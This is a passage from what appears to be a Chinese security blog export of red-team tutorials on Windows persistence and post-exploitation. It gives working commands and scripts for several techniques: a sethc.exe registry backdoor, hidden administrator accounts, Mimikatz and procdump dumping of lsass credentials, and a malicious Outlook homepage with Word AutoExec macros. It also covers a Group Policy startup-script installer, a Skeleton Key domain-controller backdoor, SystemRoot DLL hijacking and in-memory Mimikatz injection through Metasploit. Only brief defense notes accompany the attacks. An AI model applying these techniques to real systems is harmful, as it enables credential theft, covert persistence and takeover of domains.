&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; /v ReportingMode /t REG_DWORD /d 1 /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><p><img src="image-20210624234705933.png" alt="image-20210624234705933"></p><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247483994&idx=1&sn=4041632680d059c6d9ed0aba0701ca71&chksm=cf4d8d3bf83a042d23216c02418ccbd377103f65b1b0eed0cbad61b055966bccd24c7637e495&mpshare=1&scene=23&srcid=&sharer_sharetime=1571196868049&sharer_shareid=be7a01e2434a36782542fb17e9d2a6e8#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&amp;mid=2247483994&amp;idx=1&amp;sn=4041632680d059c6d9ed0aba0701ca71&amp;chksm=cf4d8d3bf83a042d23216c02418ccbd377103f65b1b0eed0cbad61b055966bccd24c7637e495&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1571196868049&amp;sharer_shareid=be7a01e2434a36782542fb17e9d2a6e8#rd</a></p><h2 id="创建后门账户："><a href="#创建后门账户：" class="headerlink" title="创建后门账户："></a>创建后门账户：</h2><h3 id="创建隐藏账户方式一"><a href="#创建隐藏账户方式一" class="headerlink" title="创建隐藏账户方式一:"></a>创建隐藏账户方式一:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user xxx$ password /add</span><br><span class="line">net localgroup administrator /add</span><br></pre></td></tr></table></figure><p><img src="image-20210624235039988.png" alt="image-20210624235039988"></p><h3 id="创建隐藏账户方式二"><a href="#创建隐藏账户方式二" class="headerlink" title="创建隐藏账户方式二:"></a>创建隐藏账户方式二:</h3><p>首先还是像上面一样创建一个$隐藏账户</p><p>然后修改注册表</p><p>hklm:\SAM\SAM\Domains\Account\Users\</p><p>复制 Administrator 也就是 0x1f4 中 F的二进制值。</p><p><img src="image-20210624235111032.png" alt="image-20210624235111032"></p><p>将其复制到新创建的隐藏账户 0x3eb 中</p><p><img src="image-20210624235126828.png" alt="image-20210624235126828"></p><p><img src="image-20210624235141313.png" alt="image-20210624235141313"></p><p>然后将0x1f4 与 0x3eb 与 bbb_1$ 全部导出</p><p><img src="image-20210624235154197.png" alt="image-20210624235154197"></p><p>再删除 bbb_1$ 这个隐藏账户</p><p><img src="image-20210624235206902.png" alt="image-20210624235206902"></p><p>最后再将导出的注册表进行导入及完成。</p><p><img src="image-20210624235222791.png" alt="image-20210624235222791"></p><h2 id="凭据提取："><a href="#凭据提取：" class="headerlink" title="凭据提取："></a>凭据提取：</h2><p>在Windows平台中，最常用的凭据提取工具便是 Mimikatz ,它能够从 lsass 中提取出用户登陆的明文账户及密码。如果提取不出明文密码，也能获得密码 hash 用以制作各种票据。其它更多的利用，不在本片文章的讨论范围，这篇文章，只简述其凭据提取的功能。</p><p>通过获取目标账户的密码或者 hash 制作的票据，我们也能达到一定程度上的权限维持的作用，当然获取密码还有更简单的方式，比如键盘记录。</p><h3 id="直接在目标机运行："><a href="#直接在目标机运行：" class="headerlink" title="直接在目标机运行："></a>直接在目标机运行：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#以管理员权限运行 mimikatz ，然后获取 debug 权限，再获取账户密码 </span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="image-20210624235236566.png" alt="image-20210624235236566"></p><p><img src="image-20210624235507170.png" alt="image-20210624235507170"></p><h3 id="通过任务管理器转储-lsass："><a href="#通过任务管理器转储-lsass：" class="headerlink" title="通过任务管理器转储 lsass："></a>通过任务管理器转储 lsass：</h3><p>除了上面直接在目标机上运行 mimikatz 的方式，我们还可以通过转储 lsass 的方式，在本地进行提取。</p><p><img src="image-20210624235530954.png" alt="image-20210624235530954"></p><p><img src="image-20210624235540206.png" alt="image-20210624235540206"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure><p><img src="image-20210624235551671.png" alt="image-20210624235551671"></p><h3 id="通过微软的小工具-procdump-进行转储："><a href="#通过微软的小工具-procdump-进行转储：" class="headerlink" title="通过微软的小工具 procdump 进行转储："></a>通过微软的小工具 procdump 进行转储：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64 -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="image-20210624235616934.png" alt="image-20210624235616934"></p><h3 id="SqlDumper"><a href="#SqlDumper" class="headerlink" title="SqlDumper:"></a>SqlDumper:</h3><p>sqldumper 是 mssql 自带的一个工具，在目标机安装了 mssql 我们都可以直接使用，以 mssql 2019 为例,其存放于 <strong>C:\Program Files\Microsoft SQL Server\150\Shared。</strong></p><p>150 for SQL Server 2019</p><p>140 for SQL Server 2017</p><p>130 for SQL Server 2016</p><p>120 for SQL Server 2014</p><p>110 for SQL Server 2012</p><p>100 for SQL Server 2008</p><p>90 for SQL Server 2005</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 获取进程PID</span><br><span class="line">tasklist /svc |findstr lsass.exe</span><br></pre></td></tr></table></figure><p><img src="image-20210624235634125.png" alt="image-20210624235634125"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#根据PID dump lsass</span><br><span class="line">sqldump.exe PID 0 0x01100</span><br></pre></td></tr></table></figure><p><img src="image-20210624235646913.png" alt="image-20210624235646913"></p><h3 id="Get-ProcessMiniDump"><a href="#Get-ProcessMiniDump" class="headerlink" title="Get-ProcessMiniDump :"></a>Get-ProcessMiniDump :</h3><p><img src="image-20210624235713354.png" alt="image-20210624235713354"></p><h2 id="OutLook-后门持久化："><a href="#OutLook-后门持久化：" class="headerlink" title="OutLook 后门持久化："></a>OutLook 后门持久化：</h2><h3 id="OutLook-主页滥用："><a href="#OutLook-主页滥用：" class="headerlink" title="OutLook 主页滥用："></a>OutLook 主页滥用：</h3><p>修改主页的目标地址，改为恶意网页地址。每次点击收件箱时都会触发漏洞。</p><p><img src="image-20210624235727773.png" alt="image-20210624235727773"></p><p>由于outlook 使用的是 ieframe.dll 来进行渲染，所以导致其可执行VBS代码。造成命令执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;en-us&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1252&quot;&gt;</span><br><span class="line">&lt;title&gt;Outlook&lt;/title&gt;</span><br><span class="line">&lt;script id=clientEventHandlersVBS language=vbscript&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"> Sub window_onload()</span><br><span class="line">     Set Application = ViewCtl1.OutlookApplication</span><br><span class="line">     Set cmd = Application.CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">     cmd.Run(&quot;notepad&quot;)</span><br><span class="line"> End Sub</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;object classid=&quot;clsid:0006F063-0000-0000-C000-000000000046&quot; id=&quot;ViewCtl1&quot; data=&quot;&quot; width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>微软已发布KB4011162补丁用以删除该功能。</p><h3 id="OutLook-规则滥用："><a href="#OutLook-规则滥用：" class="headerlink" title="OutLook  规则滥用："></a>OutLook  规则滥用：</h3><p>由于笔者的 OutLook 已修复该功能，且该规则滥用利用简单，所以不做单独演示。</p><p><a href="https://www.freebuf.com/vuls/243747.html">https://www.freebuf.com/vuls/243747.html</a></p><p>深度利用请参考：</p><p><a href="https://blog.csdn.net/weixin_34212762/article/details/90503389">https://blog.csdn.net/weixin_34212762/article/details/90503389</a></p><h3 id="Outlook-功能滥用利用工具地址："><a href="#Outlook-功能滥用利用工具地址：" class="headerlink" title="Outlook 功能滥用利用工具地址："></a>Outlook 功能滥用利用工具地址：</h3><p><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></p><h2 id="Office-持久化："><a href="#Office-持久化：" class="headerlink" title="Office 持久化："></a>Office 持久化：</h2><h3 id="宏持久化："><a href="#宏持久化：" class="headerlink" title="宏持久化："></a>宏持久化：</h3><p>创建一个作用于所有活动模板和文档的宏。</p><p><img src="image-20210624235744712.png" alt="image-20210624235744712"></p><p>然后编写对应的宏代码，或使用CS，MSF等工具生成的代码也可以。</p><p>在Word中能够自动运行的默认宏代码名称及触发条件如下：</p><p>1、名称：AutoExec 条件：启动Word或加载全局模板</p><p>2、名称：AutoNew 条件：每次生成新文档时</p><p>3、名称：AutoOpen 条件：每次打开一个已有文档时</p><p>4、名称：AutoClose 条件：每次关闭文档时</p><p>5、名称：AutoExit 条件：退出word或卸载全局模板时</p><p>一个简单的测试代码。当启动word 的时候触发。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Sub AutoExec()</span><br><span class="line">    Set sa = CreateObject(&quot;Shell.Application&quot;) &#x27;以管理员身份运行cmd</span><br><span class="line">    sa.ShellExecute &quot;cmd&quot;, &quot; /c start calc &quot;, , &quot;runas&quot;, 1</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><h2 id="HookPasswordChange"><a href="#HookPasswordChange" class="headerlink" title="HookPasswordChange:"></a>HookPasswordChange:</h2><p>在win10 测试失败，稍后在server 系统中进行测试。</p><p><a href="http://www.vuln.cn/6812">http://www.vuln.cn/6812</a></p><h2 id="组策略持久化："><a href="#组策略持久化：" class="headerlink" title="组策略持久化："></a>组策略持久化：</h2><h3 id="LGP："><a href="#LGP：" class="headerlink" title="LGP："></a>LGP：</h3><p><strong>本地组策略</strong>（Local Group Policy，缩写LGP或LocalGPO）是组策略的基础版本，它面向独立且非域的计算机。至少Windows XP家庭版中它就已经存在，并且可以应用到域计算机。在Windows Vista以前，LGP可以强制施行组策略对象到单台本地计算机，但不能将策略应用到用户或组。从Windows Vista开始，LGP允许本地组策略管理单个用户和组，并允许使用“GPO Packs”在独立计算机之间备份、导入和导出组策略——组策略容器包含导入策略到目标计算机的所需文件。–（应用之百度百科）</p><p>命令行输入 GCC 即可打开 控制台并添加本地组策略，或者运行gpedit.msc也可以</p><p><img src="image-20210624235757854.png" alt="image-20210624235757854"></p><p>本地组策略提供了非常丰富的功能，他可以设置用户访问权限，密码复杂度检验，账户锁定阈值，开关机脚本执行等等功能。</p><p><img src="image-20210624235820233.png" alt="image-20210624235820233"></p><p><img src="image-20210624235829497.png" alt="image-20210624235829497"></p><p>我们通过 LGP 的登录脚本设置，添加我们的样本文件，然后重启可以看到样本程序成功提权到system，这个点既能当做提权点，也能做权限维持。其本质与注册表提权与权限维持相同。</p><p><img src="image-20210624235839565.png" alt="image-20210624235839565"></p><p><img src="image-20210624235853193.png" alt="image-20210624235853193"></p><p>但是在实际环境中，我们有时无法通过桌面进行操作，所以我写了一个bat脚本用于修改计算机本地组策略，需要 administrator 权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">echo 需要bypassuac后才能使用</span><br><span class="line">set di=%windir%\system32\GroupPolicy\Machine\Scripts</span><br><span class="line">if exist %di% (</span><br><span class="line">echo script文件夹存在</span><br><span class="line">if exist %di%\scripts.ini (</span><br><span class="line">echo scripts.ini文件存在，删除原文件</span><br><span class="line">attrib -a -s -r -h %di%\scripts.ini</span><br><span class="line">del %di%\scripts.ini /q</span><br><span class="line">echo.&gt;%di%\scripts.ini</span><br><span class="line">echo [Startup] &gt;&gt;%di%\scripts.ini</span><br><span class="line">echo 0CmdLine = %~dp0artifact32.EXE &gt;&gt;%di%\scripts.ini</span><br><span class="line">echo 0Parameters= &gt;&gt;%di%\scripts.ini</span><br><span class="line">attrib +s +a +h %di%\scripts.ini</span><br><span class="line">) else (</span><br><span class="line">echo script.ini文件不存在,正在创建文件</span><br><span class="line">echo %di%</span><br><span class="line">echo.&gt;%di%\scripts.ini</span><br><span class="line">echo [Startup] &gt;&gt;%di%\scripts.ini</span><br><span class="line">echo 0CmdLine = %~dp0artifact32.EXE &gt;&gt;%di%\scripts.ini</span><br><span class="line">echo 0Parameters= &gt;&gt;%di%\scripts.ini</span><br><span class="line">attrib +s +a +h %di%\scripts.ini</span><br><span class="line">)</span><br><span class="line">gpupdate /force</span><br><span class="line">) else (</span><br><span class="line">echo script文件夹不存在，创建该文件夹</span><br><span class="line">md %di%</span><br><span class="line">md %di%\Shutdown</span><br><span class="line">md %di%\Startup</span><br><span class="line">echo.&gt;%di%\scripts.ini</span><br><span class="line">echo [Startup] &gt;&gt;%di%\scripts.ini</span><br><span class="line">echo 0CmdLine = %~dp0artifact32.exe &gt;&gt;%di%\scripts.ini</span><br><span class="line">echo 0Parameters= &gt;&gt;%di%\scripts.ini</span><br><span class="line">attrib +s +a +h %di%\scripts.ini</span><br><span class="line">gpupdate /force</span><br><span class="line">)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>另外如果是针对当前用户做登录启动的组策略的话，由于最终是写入到 HKCU 注册表，所以只需要当前权限即可。</p><p>当前用户的登录脚本配置是位于 %windir%\system32\GroupPolicy\user\Scripts  ，只需要修改上方脚本中的 di 地址即可。</p><h2 id="利用Skeleton-Key对域控权限进行持久化操作"><a href="#利用Skeleton-Key对域控权限进行持久化操作" class="headerlink" title="利用Skeleton Key对域控权限进行持久化操作"></a>利用Skeleton Key对域控权限进行持久化操作</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>需要拿到域控、获取域管权限</p><h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><p>Windows2003—Windows 2012 R2 x64 域控制器</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>在未注入Skeleton Key时，尝试访问域控，发现访问不到域控的C 盘共享目录</p><p><img src="web\内网\Windows权限维持/image.png" alt="image"></p><p>这时我们在域控上利用mimikatz进行Skeleton Key攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit</span><br></pre></td></tr></table></figure><p>![image (1)](D:\web\内网\Windows权限维持&#x2F;image (1).png)</p><p>当系统提示Skeleton Key注入成功时，会在域内的所有账号中添加一个Skeleton Key，默认密码就是mimikatz 然后就可以以域内任意用户的身份配合该Skeleton Key进行域内身份授权验证。</p><p>接下来在不使用域管的密码情况下，使用刚刚注入的Skeleton Key与域控建立ipc$连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\OWA2010SP3\ipc$ &quot;mimikatz&quot; /user:0day.org\administrator</span><br></pre></td></tr></table></figure><p>![image (2)](D:\web\内网\Windows权限维持&#x2F;image (2).png)</p><p>成功访问到域控！</p><p>![](D:\web\内网\Windows权限维持&#x2F;image (3).png)</p><p>现在，除非重新启动 DC，否则我们可以以域内用户身份登录任何域内计算机（使用mimikatz作为密码）</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">•域管理员用户要设置强口令，确保恶意代码不会在域控制器中执行。</span><br><span class="line">•在所有域用户中启用双因子认证，例如智能卡认证。</span><br><span class="line">• 启动应用程序白名单（例如 AppLocker)，以限制 mimikatz 在域控制器中的运行。</span><br><span class="line">在日常网络维护中注意以下方面，也可以有效防范 Skeleton Key。</span><br><span class="line">• 向域控制器注人 Skeleton Key 的方法，只能在 64位操作系统中使用，包括 Windows Server 2012 R2, Windows Server 2012. Windows Server 2008, Windows Server 2008 R2, Windows Server 2003 R2. Windows Server 2003 </span><br><span class="line">•只有具有域管理员权限的用户可以将 Skeleton Key 注人域控制器的 1sass.exe 进程。</span><br><span class="line">•Skeleton Key 被注人后，用广使用现有的密码仍然可以登录系统。</span><br><span class="line">•因为 Skeleton Key 是被注人 lsass.exe 进程的，所以它只存在于内存中。如果域控制器重启，注人的 Skeleton Key 将会失效。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dll劫持</title>
      <link href="/2020/10/15/dll%E5%8A%AB%E6%8C%81/"/>
      <url>/2020/10/15/dll%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="非常规劫持"><a href="#非常规劫持" class="headerlink" title="非常规劫持"></a>非常规劫持</h2><p><strong>用户环境变量</strong>:仅对当前用户有效，位于:<code>HKEY_CURRENT_USER\Environment</code></p><p><strong>系统环境变量</strong>:对所有用户均有效，位于:<code>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment</code></p><p>默认情况下，子进程继承其父进程的环境变量。命令处理器启动的程序继承命令处理器的环境变量。</p><h3 id="1-劫持原理"><a href="#1-劫持原理" class="headerlink" title="1.劫持原理"></a>1.劫持原理</h3><p>程序可能会依赖Windows定义好的环境变量来确定某些文件的位置，尤其对于Windows内置程序来说大量依赖环境变量来寻找系统盘文件。正常来说”<code>%SystemRoot%/System32/mswsock.dll</code>“会被解析为”<code>C:/Windows/System32/mswsock.dll</code>“，但是这里面有一个不确定的因素就是”%<code>SystemRoot%</code>“，假设我们修改了环境变量”<code>%SystemRoot%</code>“的值为其他文件夹路径且在该路径下存放恶意Dll，那么程序就会加载我们设定的Dll，继而完成Dll劫持。</p><p>如果直接更改”%<code>SystemRoot</code>%”的值，会对整个操作系统上运行的程序产生影响，但是我们可以只修改指定进程的环境变量，如创建以下vbs脚本，利用子进程默认继承其父进程环境变量的特性，修改Windows内置进程hostname.exe的环境变量”SystemRoot”为”C:\Evil”。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set shell = WScript.<span class="title function_ invoke__">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">shell.<span class="title function_ invoke__">Environment</span>(<span class="string">&quot;Process&quot;</span>)(<span class="string">&quot;SystemRoot&quot;</span>) = <span class="string">&quot;C:\Evil&quot;</span></span><br><span class="line">shell.<span class="title function_ invoke__">Exec</span>(<span class="string">&quot;C:\windows\system32\hostname.exe&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="2-持久化"><a href="#2-持久化" class="headerlink" title="2.持久化"></a>2.持久化</h3><p>完成持久化的关键就在于维持目标进程环境变量值的修改。</p><h4 id="1-利用注册表修改Windows自启服务的环境变量"><a href="#1-利用注册表修改Windows自启服务的环境变量" class="headerlink" title="1.利用注册表修改Windows自启服务的环境变量"></a>1.利用注册表修改Windows自启服务的环境变量</h4><p>这里先引用下Wietze Beukema文章中提到的修改Windows打印机服务的环境变量，看是否会成功加载指定目录下的Dll文件。</p><ol><li>首先将恶意Dll”mswsock.dll”放到指定目录”C:\Evil\System32”</li><li>在注册表spoolsv服务下创建”Environment”键值修改环境变量</li></ol><p><img src="1663348853821-4f62b33e-f8f1-4ccf-986f-de035c338dba.png" alt="img"></p><ol start="3"><li>重启spoolsv服务，用Procmon进行监控</li></ol><p><img src="1663348887306-29a50baf-afa0-4b7c-95c6-d4a62205937a.png" alt="img"></p><p>可以看到使用上述方式修改Windows服务的环境变量确实能够加载我们指定目录下的Dll文件。但是需要注意的是，有时候为了保证被修改的服务能够正常运行，我们需要将受环境变量影响的Dll全部移动到我们指定的路径下。</p><p>实际上能够被利用的Windows服务远不止上面一个，通常来说服务对应一个PE文件，这里我们去看看Windows自带服务的PE文件路径是如何写的就明白了。<br><img src="1663348926746-6fba93b5-91fd-4980-9a84-678ab8f03a46.png" alt="img"><img src="1663348969774-be2dc67c-be33-4716-86d0-c86bdce0f14b.png" alt="img"></p><p>可以看到很多服务都依赖环境变量来寻找所对应的PE文件，这里我推荐修改的Windows自启服务是Windows推送通知系统服务(WpnService)，修改环境变量后只需移动一个受影响的Dll文件即可,不用管该服务是否能够正常运行。</p><h4 id="2-常规持久化配合创建子进程"><a href="#2-常规持久化配合创建子进程" class="headerlink" title="2.常规持久化配合创建子进程"></a>2.常规持久化配合创建子进程</h4><p>我们也可以使用常规持久化方案如创建计划任务或者写注册表来实现自启，然后程序自启后自修改自身环境变量值,最后创建受环境变量影响的Windows可信进程，利用Dll劫持来完成一次隐匿攻击行为。</p><p>接下来使用Win32 API来展示下如何修改子进程的环境变量。</p><ol><li>子进程Child.exe代码如下:</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;windows.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">main</span>(<span class="keyword">int</span> argc, char* argv[], char* envp[]) &#123;</span><br><span class="line">    char szBuf[MAX_PATH] = &#123;&#125;;</span><br><span class="line">    <span class="title function_ invoke__">GetEnvironmentVariable</span>(<span class="string">&quot;SystemRoot&quot;</span>, szBuf, <span class="title function_ invoke__">sizeof</span>(szBuf));</span><br><span class="line">    <span class="title function_ invoke__">MessageBox</span>(<span class="literal">NULL</span>, szBuf, <span class="string">&quot;Child&quot;</span>, MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>父进程Parent.exe代码如下:</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;windows.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">main</span>(<span class="keyword">int</span> argc, char* argv[], char* envp[]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">SetEnvironmentVariable</span>(<span class="string">&quot;SystemRoot&quot;</span>, <span class="string">&quot;C:\\Evil&quot;</span>);</span><br><span class="line">    UINT nRet = <span class="title function_ invoke__">WinExec</span>(<span class="string">&quot;C:/Users/Super/Desktop/Child.exe&quot;</span>, SW_HIDE);</span><br><span class="line">    <span class="keyword">if</span> (nRet &gt; <span class="number">31</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;创建子进程成功\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;创建子进程失败\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>运行Parent.exe进程即可</li></ol><p>以上需要注意一点的就是，当Child.exe进程需要的权限比Parent.exe进程高时，Parent.exe创建Child.exe进程时会失败，当然也就无法谈起修改其环境变量值了</p><h3 id="3-防范"><a href="#3-防范" class="headerlink" title="3.防范"></a>3.防范</h3><ol><li>程序代码使用GetWindowsDirectory代替环境变量”%SystemRoot%”，或者使用GetSystemDirectory直接拿系统盘System32路径</li><li>对系统Dll进行路径检测</li><li>对程序加载的Dll进行签名校验</li></ol>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>奇技淫巧</title>
      <link href="/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
      <url>/2020/10/14/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>介绍一些在内网中罕见的攻击方式</p><span id="more"></span><h2 id="1-交互式内存加载"><a href="#1-交互式内存加载" class="headerlink" title="1.交互式内存加载"></a>1.交互式内存加载</h2><h3 id="Msf-donut交互式执行内存"><a href="#Msf-donut交互式执行内存" class="headerlink" title="Msf+donut交互式执行内存"></a>Msf+donut交互式执行内存</h3><p>msf得到一个会话</p><p><img src="image-20210204185453881.png" alt="image-20210204185453881"></p><p>生成一个bin文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./donut -f /root/webtools/BypassAntiVirus/mimikatz/mimikatz_trunk_2.2.0/x64/mimikatz.exe  -a 2 -o /tmp/payload.bin</span><br><span class="line">#-f：指定文件位置</span><br><span class="line">#－a：是指定位数，2-64位，1-32位</span><br><span class="line">#－o：是指定输出</span><br></pre></td></tr></table></figure><p>再使用刚刚生成的bin文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use post/windows/manage/shellcode_inject </span><br><span class="line">msf5 post(windows/manage/shellcode_inject) &gt; set shellcode /tmp/payloads.bin</span><br><span class="line">shellcode =&gt; /tmp/payloads.bin</span><br><span class="line">msf5 post(windows/manage/shellcode_inject) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf5 post(windows/manage/shellcode_inject) &gt; run</span><br></pre></td></tr></table></figure><p>但是出错</p><p><img src="image-20210204185823677.png" alt="image-20210204185823677"></p><p>因为我们生成木马是32位，机器是64位，使用将进程迁移到64的进程即可。</p><p>执行会得到一个交互式的mimikatz环境</p><p><img src="image-20210204190010171.png" alt="image-20210204190010171"></p><p>这种方法在x86的机器上比较方便。</p><h3 id="2-无power-shell运行power-shell"><a href="#2-无power-shell运行power-shell" class="headerlink" title="2.无power shell运行power shell"></a>2.无power shell运行power shell</h3><h4 id="1-powerline"><a href="#1-powerline" class="headerlink" title="1.powerline"></a>1.powerline</h4><p>PowerLine是一款由c#编写的工具，支持本地命令行调用和远程调用，可以在不直接调用PowerShell的情况下调用PowerShell脚本.</p><p>优点：1.自动识别win7、win10系统  2.使用方便,无需复杂的ide  3.自动xor编码</p><p>下载地址： <a href="https://github.com/fullmetalcache/PowerLine">https://github.com/fullmetalcache/PowerLine</a></p><p>首先将其项目放置目标机器，执行其bat文件（cmd下也可）</p><p><img src="image-20210204191318286.png" alt="image-20210204191318286"></p><p>然后在UserConf.xml文件中填写你所需要调用的powershell脚本的地址，默认自带powerup、powerview、Mimikatz等，只要按照他给定的格式加入你的ps脚本地址即可</p><p><img src="image-20210204191638597.png" 